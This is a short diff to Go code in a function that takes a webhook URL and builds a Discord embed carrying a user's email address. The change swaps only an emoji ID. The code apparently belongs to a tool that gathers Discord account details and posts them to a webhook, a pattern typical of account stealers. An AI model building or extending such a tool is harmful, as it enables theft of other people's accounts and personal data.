@@ -313,7 +313,7 @@ func Run(webhook string) {
 				},
 				{"name": "\u200b", "value": "\u200b", "inline": false},
 				{
-					"name":   "<:mail:1162480464733405338> Email:",
+					"name":   "<:egp_mail:875383124241055845> Email:",
 					"value":  "`" + user.Email + "`",
 					"inline": true,
 				},
